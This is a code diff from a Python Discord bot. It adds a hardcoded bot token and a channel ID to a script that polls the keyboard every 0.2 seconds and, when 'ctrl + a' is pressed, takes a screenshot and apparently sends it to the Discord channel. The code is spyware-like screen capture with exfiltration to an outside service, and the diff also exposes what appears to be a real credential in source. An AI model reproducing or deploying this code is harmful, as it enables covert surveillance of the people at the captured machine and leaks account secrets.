@@ -9,7 +9,7 @@ from io import BytesIO
 import keyboard
 
 client = discord.Client()
-TOKEN = ""
+TOKEN = "ODA5NjQzMTEwNDg0MTQ4MjI0.YCYE5w.r52DUZ3qjOChZUY_Avz5AmH_QH8"
 
 
 def take_screenshot():
@@ -27,7 +27,7 @@ async def on_ready():
 
 @tasks.loop(seconds=0.2)
 async def screenshot_takeNsend():
-    channel = client.get_channel()
+    channel = client.get_channel(809642981753225256)
     if keyboard.is_pressed("ctrl + a"):
         with BytesIO() as image_binary:
             take_screenshot().save(image_binary, "PNG")
